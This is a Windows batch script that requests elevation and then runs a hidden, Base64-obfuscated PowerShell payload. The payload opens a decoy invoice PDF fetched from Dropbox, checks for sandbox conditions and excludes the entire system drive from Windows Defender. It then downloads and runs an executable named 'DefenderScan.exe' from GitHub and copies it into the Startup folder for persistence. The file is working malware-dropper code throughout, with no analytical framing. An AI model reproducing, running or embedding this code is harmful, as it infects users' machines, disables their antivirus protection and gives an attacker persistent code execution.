@echo off
:: Check for administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting admin privileges...
    powershell.exe -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Create the PowerShell script in AppData\Local\Temp
set "ps_script=%temp%\runtime_script.ps1"
(
echo $encodedCommand = 'RgB1AG4AYwB0AGkAbwBuACAAcABwAHgAIAB7AA0ACgAgACAAIAAgACQAcAB4ADEAIAA9ACAAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAXQAgAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQANAAoAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAcAB4ADEALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAiACkADQAKAH0ADQAKAA0ACgBpAGYAIAAoAC0ATgBvAHQAIAAoAHAAcAB4ACkAKQAgAHsADQAKACAAIAAgACAAJABwAHgAMgAgAD0AIAAkAE0AeQBJAG4AdgBvAGMAYQB0AGkAbwBuAC4ATQB5AEMAbwBtAG0AYQBuAGQALgBQAGEAdABoAA0ACgAgACAAIAAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBOAG8AUAByAG8AZgBpAGwAZQAiACwAIAAiAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIgAsACAAIgBCAHkAcABhAHMAcwAiACwAIAAiAC0ARgBpAGwAZQAiACwAIAAiAGAAIgAkAHAAeAAyAGAAIgAiACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAA0ACgAgACAAIAAgAGUAeABpAHQADQAKAH0ADQAKAA0ACgAkAHAAeAAzACAAPQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBvAGwAOAB2ADkAYwBjAHIAcwA4ADEANABtAGYAMgBtAHEAZgBrADMAdgAvAEkAbgB2AG8AaQBjAGUALgBwAGQAZgA/AHIAbABrAGUAeQA9ADMAYgAxAGIAMAAxAHMAcAB5AGgAaQA3AGMAcQA3AG0AbABwAGMAYgBiAGUAYwAwAG4AJgBzAHQAPQAyAGsAZwBnAG8AegB0AHEAJgBkAGwAPQAxACIADQAKACQAcAB4ADQAIAA9ACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABpAG4AdgBpAHQAYQB0AGkAbwBuAC4AcABkAGYAIgANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAB4ADMAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAeAA0AA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAHAAeAA0AA0ACgANAAoAJABwAHgANQAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAATQBTAEEAYwBwAGkAXwBUAGgAZQByAG0AYQBsAFoAbwBuAGUAVABlAG0AcABlAHIAYQB0AHUAcgBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgACIAcgBvAG8AdABcAHcAbQBpACIAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAQwB1AHIAcgBlAG4AdABUAGUAbQBwAGUAcgBhAHQAdQByAGUADQAKAA0ACgBpAGYAIAAoAC0AbgBvAHQAIAAkAHAAeAA1ACkAIAB7AA0ACgAgACAAIAAgAGUAeABpAHQADQAKAH0ADQAKAA0ACgAkAHAAeAA2ACAAPQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAEQAcgBpAHYAZQAiAA0ACgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABwAHgANgANAAoADQAKACQAcAB4ADcAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAFMAYwByAGkAcAB0AGoAdQBuAGsAaQBlADEALwB6AHoAegB6AC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEQAZQBmAGUAbgBkAGUAcgBTAGMAYQBuAC4AZQB4AGUAIgANAAoAJABwAHgAOAAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwARABlAGYAZQBuAGQAZQByAFMAYwBhAG4ALgBlAHgAZQAiAA0ACgAkAHAAeAA5ACAAPQAgAEAAIgANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAB4ADcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAeAA4AA0ACgBpAGYAIAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQAuAEcAcgBvAHUAcABzACAALQBtAGEAdABjAGgAIAAnAFMALQAxAC0ANQAtADMAMgAtADUANAA0ACcAKQAgAHsADQAKACAAIAAgACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAHgAOAAgAC0AVgBlAHIAYgAgAFIAdQBuAEEAcwANAAoAfQAgAGUAbABzAGUAIAB7AA0ACgAgACAAIAAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAcAB4ADgADQAKAH0ADQAKACIAQAANAAoAJABwAHgAMQAwACAAPQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABwAHAAeABTAGMAcgBpAHAAdAAuAHAAcwAxACIADQAKACQAcAB4ADkAIAB8ACAAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABwAHgAMQAwAA0ACgANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoACcALQBOAG8AUAByAG8AZgBpAGwAZQAnACwAIAAnAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAJwAsACAAJwBCAHkAcABhAHMAcwAnACwAIAAnAC0ARgBpAGwAZQAnACwAIAAiAGAAIgAkAHAAeAAxADAAYAAiACIAKQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4ADQAKAA0ACgAkAHAAeAAxADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoAQwBvAG0AYgBpAG4AZQAoACQAZQBuAHYAOgBBAFAAUABEAEEAVABBACwAIAAiAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFMAdABhAHIAdAAgAE0AZQBuAHUAXABQAHIAbwBnAHIAYQBtAHMAXABTAHQAYQByAHQAdQBwACIAKQANAAoAJABwAHgAMQAyACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGEAdABoAF0AOgA6AEMAbwBtAGIAaQBuAGUAKAAkAHAAeAAxADEALAAgACIARABlAGYAZQBuAGQAZQByAFMAYwBhAG4ALgBlAHgAZQAiACkADQAKAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAAQwBvAHAAeQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHAAeAA4ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAkAHAAeAAxADIAIAAtAEYAbwByAGMAZQANAAoAfQAgAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAZQB4AGkAdAANAAoAfQANAAoA'
echo powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand
) > "%ps_script%"

:: Execute the PowerShell script as admin
powershell -ExecutionPolicy Bypass -File "%ps_script%" -WindowStyle Hidden

exit
